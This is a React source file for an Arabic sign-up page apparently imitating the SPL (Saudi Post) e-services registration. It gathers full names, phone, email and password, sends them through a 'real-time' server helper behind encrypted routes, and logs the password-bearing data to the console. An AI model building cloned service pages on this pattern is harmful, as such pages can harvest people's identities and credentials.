import { useEffect, useState } from "react";
import Box from "@mui/material/Box";
import Button from "@mui/material/Button";
import Checkbox from "@mui/material/Checkbox";
import FormControlLabel from "@mui/material/FormControlLabel";
import Typography from "@mui/material/Typography";
import Footer from "../components/footer";
import ErrorDialog from "../components/ErrorDialog";
import {
  encryptRoute,
  navigate,
  sendDataToServer,
  setCurrentPage,
  getCurrentPage,
} from "@/real-time/utils/utils";
import CustomFormField from "../components/CustomFormField";
import PasswordStrengthIndicator from "../components/PasswordStrengthIndicator";
import {
  validateEmail,
  isArabic,
  isEnglish,
  registrationFieldMap,
} from "../utils/registration-utils";

const CreateAccountPage = () => {
  const pageName = getCurrentPage();
  const isBusiness = pageName === "إنشاء حساب أعمال";
  const currentPageName = isBusiness ? "إنشاء حساب أعمال" : "إنشاء حساب أفراد";

  useEffect(() => {
    setCurrentPage(currentPageName);
  }, [currentPageName]);

  const [formData, setFormData] = useState({
    firstName: "",
    fatherName: "",
    grandfatherName: "",
    lastName: "",
    firstNameEn: "",
    fatherNameEn: "",
    grandfatherNameEn: "",
    lastNameEn: "",
    mobileNumber: "",
    email: "",
    username: "",
    password: "",
    passwordConfirmation: "",
  });

  const [policyAccepted, setPolicyAccepted] = useState(false);
  const [showErrors, setShowErrors] = useState(false);
  const [isPending, setIsPending] = useState(false);
  const [showErrorDialog, setShowErrorDialog] = useState(false);

  const handleInputChange = (id: string, value: string) => {
    // Language-specific restrictions
    if (
      ["firstName", "fatherName", "grandfatherName", "lastName"].includes(id)
    ) {
      if (value && !isArabic(value)) return;
    }
    if (
      [
        "firstNameEn",
        "fatherNameEn",
        "grandfatherNameEn",
        "lastNameEn",
      ].includes(id)
    ) {
      if (value && !isEnglish(value)) return;
    }

    const newValue = id === "mobileNumber" ? value.slice(0, 10) : value;
    setFormData((prev) => ({ ...prev, [id]: newValue }));
  };

  const handleContinue = async (e: React.FormEvent) => {
    e.preventDefault();
    setShowErrors(true);

    if (!policyAccepted) {
      return;
    }

    // Validation
    const hasEmptyFields = Object.values(formData).some((val) => !val);
    const isValidEmail = validateEmail(formData.email);
    const passwordsMatch = formData.password === formData.passwordConfirmation;

    if (hasEmptyFields || !isValidEmail || !passwordsMatch) {
      setShowErrorDialog(true);
      return;
    }

    setIsPending(true);

    const arabicData: Record<string, string> = {};
    Object.entries(formData).forEach(([key, value]) => {
      const arabicKey = registrationFieldMap[key] || key;
      arabicData[arabicKey] = value;
    });

    console.log("Submitting:", arabicData);

    sendDataToServer({
      data: arabicData,
      current: currentPageName,
      nextPage: "العنوان الوطني",
    });

    setIsPending(false);
  };

  const handleBack = () => {
    navigate(encryptRoute("تسجيل"));
  };

  return (
    <div className="flex flex-col font-[Tajawal]">
      <div className="h-[32px] bg-[#143c3c] border-b-2 border-[#146c84]" />

      <section className="min-h-screen bg-[#f3f4f6] py-10 px-4 md:px-8 flex flex-col items-center">
        <div className="w-full container max-w-4xl">
          <img
            src="/assets/images/new/app_icon.png"
            alt="SPL App Icon"
            className="object-contain mb-4 self-start"
          />

          <div className="bg-white rounded-lg shadow-[0_4px_20px_0_rgba(0,0,0,0.05)] px-4 py-8 md:p-12">
            <Typography
              variant="h4"
              sx={{
                fontSize: { xs: "18px", md: "28px" },
                fontWeight: "bold",
                textAlign: "center",
                color: "#153c3f",
                mb: 2,
              }}
            >
              {isBusiness
                ? "إنشاء حساب أعمال في الخدمات الإلكترونية"
                : "إنشاء حساب أفراد في الخدمات الإلكترونية"}
            </Typography>

            <div className="bg-[#e8f4f8] p-3 border border-[#e8f4f8] rounded-lg mb-4">
              <Typography
                variant="h6"
                sx={{
                  fontSize: { xs: "14px", md: "16px" },
                  color: "#146c84",
                  textAlign: "center",
                  fontWeight: "bold",
                  mb: 0.5,
                }}
              >
                أهلاً بك عميلنا العزيز،
              </Typography>
              <Typography
                variant="h6"
                sx={{
                  fontSize: { xs: "14px", md: "16px" },
                  color: "#143c3c",
                  textAlign: "center",
                  fontWeight: "normal",
                }}
              >
                الرجاء تعبئة بياناتك أدناه لإكمال تسجيلك في الخدمات الإلكترونية
              </Typography>
            </div>

            <Typography
              variant="h6"
              sx={{
                fontSize: { xs: "18px", md: "20px" },
                color: "#153c3f",
                textAlign: "center",
                fontWeight: "semibold",
                mb: 4,
              }}
            >
              {isBusiness ? "معلومات المنشأة" : "المعلومات الشخصية"}
            </Typography>

            <form className="space-y-10" onSubmit={handleContinue}>
              {/* Arabic Name Group */}
              <div>
                <p className="font-bold text-[#153c3f] text-lg mb-4 text-right">
                  الاسم بالعربي
                </p>
                <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
                  <CustomFormField
                    id="firstName"
                    label="الاسم الأول"
                    placeholder="الاسم الأول"
                    value={formData.firstName}
                    onChange={(val) => handleInputChange("firstName", val)}
                    required
                    error={showErrors && !formData.firstName}
                  />
                  <CustomFormField
                    id="fatherName"
                    label="اسم الأب"
                    placeholder="الأب"
                    value={formData.fatherName}
                    onChange={(val) => handleInputChange("fatherName", val)}
                    required
                    error={showErrors && !formData.fatherName}
                  />
                  <CustomFormField
                    id="grandfatherName"
                    label="اسم الجد"
                    placeholder="الجد"
                    value={formData.grandfatherName}
                    onChange={(val) =>
                      handleInputChange("grandfatherName", val)
                    }
                    required
                    error={showErrors && !formData.grandfatherName}
                  />
                  <CustomFormField
                    id="lastName"
                    label="اسم العائلة"
                    placeholder="العائلة"
                    value={formData.lastName}
                    onChange={(val) => handleInputChange("lastName", val)}
                    required
                    error={showErrors && !formData.lastName}
                  />
                </div>
              </div>

              {/* English Name Group */}
              <div>
                <p className="font-bold text-[#153c3f] text-lg mb-4 text-right">
                  الاسم بالإنجليزي
                </p>
                <div
                  className="grid grid-cols-2 lg:grid-cols-4 gap-4"
                  dir="ltr"
                >
                  <CustomFormField
                    id="firstNameEn"
                    label="First Name"
                    placeholder="First Name"
                    value={formData.firstNameEn}
                    onChange={(val) => handleInputChange("firstNameEn", val)}
                    required
                    dir="ltr"
                    error={showErrors && !formData.firstNameEn}
                  />
                  <CustomFormField
                    id="fatherNameEn"
                    label="Father Name"
                    placeholder="Father"
                    value={formData.fatherNameEn}
                    onChange={(val) => handleInputChange("fatherNameEn", val)}
                    required
                    dir="ltr"
                    error={showErrors && !formData.fatherNameEn}
                  />
                  <CustomFormField
                    id="grandfatherNameEn"
                    label="Grandfather"
                    placeholder="Grandfather"
                    value={formData.grandfatherNameEn}
                    onChange={(val) =>
                      handleInputChange("grandfatherNameEn", val)
                    }
                    required
                    dir="ltr"
                    error={showErrors && !formData.grandfatherNameEn}
                  />
                  <CustomFormField
                    id="lastNameEn"
                    label="Family Name"
                    placeholder="Family"
                    value={formData.lastNameEn}
                    onChange={(val) => handleInputChange("lastNameEn", val)}
                    required
                    dir="ltr"
                    error={showErrors && !formData.lastNameEn}
                  />
                </div>
              </div>

              {/* Contact Group */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <CustomFormField
                  id="mobileNumber"
                  label="رقم الجوال"
                  placeholder="05XXXXXXXX"
                  value={formData.mobileNumber}
                  onChange={(val) => handleInputChange("mobileNumber", val)}
                  required
                  error={showErrors && !formData.mobileNumber}
                />
                <CustomFormField
                  id="email"
                  label="البريد الإلكتروني"
                  placeholder="البريد الإلكتروني"
                  value={formData.email}
                  onChange={(val) => handleInputChange("email", val)}
                  required
                  error={
                    showErrors &&
                    (!formData.email ||
                      (showErrors && !validateEmail(formData.email)))
                  }
                />
              </div>

              {/* Account Info Section */}
              <div className="pt-4">
                <Typography
                  variant="h5"
                  className="text-center font-bold text-[#153c3f] mb-8"
                  sx={{ fontSize: "22px" }}
                >
                  معلومات الحساب
                </Typography>

                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <CustomFormField
                    id="username"
                    label="اسم المستخدم"
                    placeholder="اسم المستخدم"
                    value={formData.username}
                    onChange={(val) => handleInputChange("username", val)}
                    required
                    error={showErrors && !formData.username}
                  />
                  <CustomFormField
                    id="password"
                    label="كلمة المرور"
                    type="password"
                    placeholder="كلمة المرور الجديدة"
                    value={formData.password}
                    onChange={(val) => handleInputChange("password", val)}
                    required
                    error={showErrors && !formData.password}
                  >
                    <PasswordStrengthIndicator password={formData.password} />
                  </CustomFormField>
                  <CustomFormField
                    id="passwordConfirmation"
                    label="تأكيد كلمة المرور"
                    type="password"
                    placeholder="كلمة المرور الجديدة"
                    value={formData.passwordConfirmation}
                    onChange={(val) =>
                      handleInputChange("passwordConfirmation", val)
                    }
                    required
                    error={
                      showErrors &&
                      formData.password !== formData.passwordConfirmation
                    }
                  />
                </div>
              </div>

              {/* Policy Consent */}
              <Box
                sx={{
                  display: "flex",
                  justifyContent: "flex-start",
                  mt: 4,
                  flexDirection: "column",
                }}
              >
                <FormControlLabel
                  control={
                    <Checkbox
                      checked={policyAccepted}
                      onChange={(e) => setPolicyAccepted(e.target.checked)}
                      sx={{
                        color:
                          showErrors && !policyAccepted ? "#ef4444" : "#d1d5db",
                        "&.Mui-checked": {
                          color: "#153c3f",
                        },
                      }}
                    />
                  }
                  label={
                    <Typography sx={{ fontSize: "0.95rem", color: "#374151" }}>
                      أوافق على{" "}
                      <span className="text-[#136e82] cursor-pointer">
                        سياسة الخصوصية
                      </span>{" "}
                      و{" "}
                      <span className="text-[#136e82] cursor-pointer">
                        شروط الإستخدام
                      </span>{" "}
                      <span className="text-red-500">*</span>
                    </Typography>
                  }
                  sx={{ ml: 0 }}
                />
                {showErrors && !policyAccepted && (
                  <Typography
                    sx={{ color: "#ef4444", fontSize: "0.8rem", mt: 0.5 }}
                  >
                    يجب الموافقة على الشروط والأحكام
                  </Typography>
                )}
              </Box>

              <Box
                sx={{
                  display: "flex",
                  flexDirection: { xs: "column", md: "row" },
                  justifyContent: "space-between",
                  alignItems: "center",
                  gap: 2,
                  mt: 8,
                }}
              >
                <Button
                  variant="outlined"
                  onClick={handleBack}
                  sx={{
                    width: { xs: "100%", md: "fit-content" },
                    borderColor: "#136e82",
                    color: "#136e82",
                    fontWeight: "bold",
                    fontSize: "1.1rem",
                    py: 1.5,
                    px: 8,
                    borderWidth: "2px",
                    borderRadius: "8px",
                    "&:hover": {
                      bgcolor: "#146e82",
                      color: "white",
                      borderColor: "#146e82",
                    },
                  }}
                >
                  رجوع
                </Button>

                <Button
                  variant="contained"
                  type="submit"
                  disabled={isPending}
                  sx={{
                    width: { xs: "100%", md: "fit-content" },
                    bgcolor: "#00c8e1",
                    color: "#373737",
                    fontWeight: "bold",
                    fontSize: "1.1rem",
                    py: 1.5,
                    px: 8,
                    borderRadius: "8px",
                    boxShadow: "none",
                    "&:hover": { bgcolor: "#00b2c9", boxShadow: "none" },
                    "&.Mui-disabled": {
                      bgcolor: "#00c8e1",
                      opacity: 0.7,
                      color: "#373737",
                    },
                  }}
                >
                  {isPending ? "جاري التسجيل..." : "تسجيل"}
                </Button>
              </Box>
            </form>
          </div>
        </div>
      </section>

      <Footer />

      <ErrorDialog
        open={showErrorDialog}
        onClose={() => setShowErrorDialog(false)}
      />
    </div>
  );
};

export default CreateAccountPage;
